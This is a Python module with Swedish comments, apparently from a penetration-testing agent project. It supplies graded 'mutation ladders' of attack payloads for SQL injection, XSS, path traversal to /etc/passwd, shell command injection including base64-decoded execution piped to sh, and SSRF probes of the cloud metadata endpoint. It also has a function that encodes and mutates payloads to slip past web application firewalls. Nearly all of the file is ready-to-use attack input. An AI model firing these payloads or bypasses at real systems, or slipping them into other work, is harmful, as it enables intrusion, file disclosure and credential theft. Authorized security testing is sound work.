"""Payload Mutation Ladders & WAF Bypass Protocol (Issue #95).

Inspirerad av pentest-agents (rules/payloads.md & rules/waf-bypass-protocol.md).
Tillhandahåller strukturerade test-trappor med ökande nivåer av kodning och försvarsbypasser
(stacked encoding, null-byte injection, unicode normalisering, chunked/header mutationer).
"""

import urllib.parse
from typing import List, Dict, Any

# Trappor för olika attacktyper
LADDERS = {
    "sqli": [
        ("Level 1: Raw SQL Union", "' UNION SELECT 1,2,3-- -"),
        ("Level 2: URL Encoded", "%27%20UNION%20SELECT%201%2C2%2C3--%20-"),
        ("Level 3: Double URL Encoded", "%2527%2520UNION%2520SELECT%25201%252C2%252C3--%2520-"),
        ("Level 4: Inline Comment Bypass", "'/**/UNION/**/SELECT/**/1,2,3--/**/-"),
        ("Level 5: Case & Whitespace Mutation", "'+uNiOn+sElEcT+1,2,3--+")
    ],
    "xss": [
        ("Level 1: Standard Script Tag", "<script>alert(1)</script>"),
        ("Level 2: Img Error Handler", "<img src=x onerror=alert(1)>"),
        ("Level 3: SVG Load & Case Mutation", "<sVg/oNlOaD=alert(1)>"),
        ("Level 4: Encoded Entities & Prompt Breakout", "&lt;script&gt;alert(1)&lt;/script&gt;"),
        ("Level 5: Stacked Unicode & Nullbyte Bypass", "%u003cscript%u003ealert(1)%u003c/script%u003e")
    ],
    "path_traversal": [
        ("Level 1: Raw Dot-Dot-Slash", "../../../../etc/passwd"),
        ("Level 2: Standard URL Encoded", "..%2F..%2F..%2F..%2Fetc%2Fpasswd"),
        ("Level 3: Double Encoded Traversal", "..%252F..%252F..%252F..%252Fetc%252Fpasswd"),
        ("Level 4: Overlong UTF-8 & Backslash", "..%c0%af..%c0%af..%c0%afetc/passwd"),
        ("Level 5: Null Byte Terminated", "../../../../etc/passwd%00.png")
    ],
    "command_injection": [
        ("Level 1: Direct Pipe/Semicolon", "; id"),
        ("Level 2: Backticks & Shell Sub", "`id`"),
        ("Level 3: Dollar Parentheses Sub", "$(id)"),
        ("Level 4: IFS Space Bypass", ";cat$IFS/etc/passwd"),
        ("Level 5: Base64 Decoded Execution", ";echo$IFS'aWQ='|base64$IFS-d|sh")
    ],
    "ssrf": [
        ("Level 1: Localhost IP", "http://127.0.0.1:8080/"),
        ("Level 2: Cloud Metadata IPv4", "http://169.254.169.254/latest/meta-data/"),
        ("Level 3: Decimal IP Representation", "http://2130706433/"),
        ("Level 4: Hex / Octal IPv4 Notation", "http://0x7f000001/"),
        ("Level 5: IPv6 Compressed Loopback", "http://[::1]:8080/")
    ]
}


def get_mutation_ladder(attack_type: str) -> List[tuple]:
    """Hämtar payload mutation ladder för en viss attacktyp."""
    attack_type = attack_type.lower()
    for k, v in LADDERS.items():
        if k in attack_type or attack_type in k:
            return v
    return [
        ("Level 1: Baseline Input", "test_payload"),
        ("Level 2: URL Encoded", "%74%65%73%74"),
        ("Level 3: Special Character Probe", "'\"`$><&;"),
        ("Level 4: Boundary Overflow", "A" * 1024)
    ]


def apply_waf_bypass_protocol(payload: str) -> List[Dict[str, str]]:
    """Genererar en serie WAF-bypass-mutationer för en given payload.
    
    Inkluderar URL-kodning, dubbel-kodning, whitespace-ersättningar och inline-kommentarer.
    """
    results = [
        {"strategy": "raw", "payload": payload},
        {"strategy": "url_encoded", "payload": urllib.parse.quote(payload)},
        {"strategy": "double_url_encoded", "payload": urllib.parse.quote(urllib.parse.quote(payload))},
        {"strategy": "whitespace_plus", "payload": payload.replace(" ", "+")},
        {"strategy": "whitespace_comments", "payload": payload.replace(" ", "/**/")},
        {"strategy": "mixed_case", "payload": "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))}
    ]
    return results
